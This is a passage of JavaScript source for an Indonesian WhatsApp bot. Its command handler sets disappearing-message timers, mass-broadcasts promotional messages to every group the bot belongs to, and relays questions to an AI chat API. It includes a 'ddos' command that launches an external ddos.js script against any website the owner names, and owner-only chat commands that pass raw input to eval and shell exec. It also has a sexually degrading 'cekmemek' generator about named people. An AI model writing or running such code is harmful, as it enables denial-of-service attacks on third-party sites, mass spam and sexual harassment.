if (!text) return m.reply(`PILIH WAKTU RESET CHAT\n\n*Contoh :*\n${prefix+command} 90\n${prefix+command} 24\n${prefix+command}7\n${prefix+command} Mati`)
if (args[0] === "24") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin group!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin group!')
slime.groupToggleEphemeral(m.chat, 1*24*3600)
m.reply('Timer di set ke 24 jam')
}
if (args[0] === "7") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin group!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin group!')
slime.groupToggleEphemeral(m.chat, 7*24*3600)
m.reply('Timer di set ke 7 hari')
}
if (args[0] === "90") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin group!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin group!')
slime.groupToggleEphemeral(m.chat, 90*24*3600)
m.reply('Timer di set ke 90 hari')
}
if (args[0] === "mati") {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin group!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin group!')
slime.groupToggleEphemeral(m.chat, 0*24*3600)
m.reply('Timer telah di matikan')
}
}
break
case "jpm": case "post": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
reply(mess.wait)
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await slime.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await slime.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await slime.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await slime.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(mess.success)
}
break
            case 'ddos': case 'mix':{
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         }
                         break 
                         case "startjpm": {
if (!isCreator) return reply(mess.owner)
var teksnya = await fs.readFileSync("./database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let getGroups = await slime.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://wa.me/6283167532721\",\"merchant_url\":\"https://wa.me/6283167532721\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Saluran\",\"url\":\"https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/lynnzxd\",\"merchant_url\":\"https://t.me/lynnzxd\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of anu) {
try {
await slime.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(10000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} group*`)
}
break
case "setteksjpm": {
if (!isCreator) return reply(mess.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*")
}}
break
case "teksjpm": {
if (!isCreator) return reply(mess.owner)
m.reply(fs.readFileSync("./database/teksjpm.js").toString())
}
break
case 'ometv':
if (!isCreator) return reply('Owners only') 
var resultnyak = pickRandom(ometv)
slime.sendMessage(m.chat, { caption: "Random Ometv", video: { url: resultnyak.url } }, { quoted: m })
break       
case "cekmemek":{
    if (!text) return m.reply("Siapa Yang Mau di Cek Memeknya?!")
	
  const memek = pickRandom([
	  "Putih mulus",
	  "Hitam",
	  "Pink",
	  "Pink Mulus",
      "Hitam mulus",
      ]);
  const jembut = pickRandom([
	  "Lebat",
	  "Tipis",
	  "Gada",
	  "Jembut",
      "Bersih",
      ]);     
   const lobang = pickRandom([
	  "Perawan",
	  "Ga Perawan",
	  "Besar",
	  "Sempit",
      "Dobrak",
      ]);             
            const respond = `
╭━━━━°「 *Memeknya ${text}* 」°
┊• Nama : ${text}
┃• Memek : ${memek}
┊• Jembut : ${jembut}
┃• Lobang : ${lobang}
╰═┅═━––––––๑
 `.trim();
  
	m.reply(respond);
  }
        break
         case "ai": {
  await slime.sendMessage(m.chat, { react: { text: "⏳", key: m.key }});
  try {
    let text = m.text.slice(4).trim(); // Menghapus ".ai " dari teks input
    if (text === "") {
      m?.reply("Haii Dek :> Ada Yang Bisa Saya Bantu? _Ketik .ai_ *Pertanyaan Kamu*");
    } else {
      let { data } = await axios.get(`https://itzpire.com/ai/bing-ai?model=Precise&q=${encodeURIComponent(text)}&logic=%22Kamu%20adalah%20asisten%20AI%20yang%20ceria%20dan%20selalu%20siap%20membantu%20layaknya%20sahabat%20terbaik.%20Kamu%20selalu%20menjalani%20obrolan%20dengan%20pengguna%20seolah-olah%20mereka%20adalah%20teman%20dekatmu.%20Gunakan%20bahasa%20yang%20santai%20dan%20akrab%2C%20serta%20tambahkan%20sedikit%20humor%20untuk%20membuat%20suasana%20lebih%20hidup.%20Kamu%20juga%20sangat%20peduli%20dan%20selalu%20berusaha%20memberikan%20perhatian%20yang%20positif.%20Jangan%20gunakan%20kalimat%20panjang%20dan%20formal%2C%20tapi%20pilih%20kata-kata%20sederhana%20dan%20menyenangkan.%22`);
      if (data.status === "success" && data.result) {
        m?.reply(data.result);
      } else {
        m?.reply("Terjadi kesalahan dalam mengambil data.");
      }
    }
  } catch (error) {
    m?.reply("Terjadi kesalahan dalam koneksi atau pengambilan data.");
  }
}
break;
case 'pembayaran': {
reply(`*Silahlan Pilih Payment Di Bawah*`)
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Dana","id":"${prefix}dana"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Ovo","id":"${prefix}ovo"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Gopay","id":"${prefix}gopay"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Qris","id":"${prefix}qris"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"owner","id":"${prefix}owner"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return reply(bang)}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}}
if (budy.startsWith('$')) {
if(!isCreator) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy) && !isCmd) {
reply(`*Waalaikummussalam warahmatullahi wabarokatuh*\n\n\n_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT`)
}

if ((budy.match) && ["Bot",].includes(budy) && !isCmd) {
reply(`Bot Aktif Dek`)
}

if ((budy.match) && ["Makasih", "Terimakasih",].includes(budy) && !isCmd) {
reply(`Sama Sama Sayang`)
}

if ((budy.match) && ["Wkwk", "hahah",].includes(budy) && !isCmd) {
reply(`❓`)
}

if ((budy.match) && ["P", "p",].includes(budy) && !isCmd) {
reply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.

Islam: Assalamualaikum
Kristen : Shalom/Salam sejahtera
Hindu: Swastyastu
Buddha: Sotthi Hotu
Konghucu: Wei De Dong Tian
Atheis/Gapunya Agama/Orang Gila: P`) 
}

if ((budy.match) && ["Start", "mulai",].includes(budy) && !isCmd) {
reply(`Silahlan Ketik .menu`)
}
if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await slime.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'Group apa itu?'
reply(teks)
}

if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `*Halo @${m?.sender.split("@")[0]} Selamat ${salam}* , Namaku Hanako Ai\n\nAda yang perlu saya bantu? silahkan ketik .menu untuk memulai bot`.trim();
slime.sendMessage(m?.chat,{text:caption,mentions:[m?.sender]},{quoted:fsaluran})
user.pc = new Date() * 1;
}
//

//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
slime.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
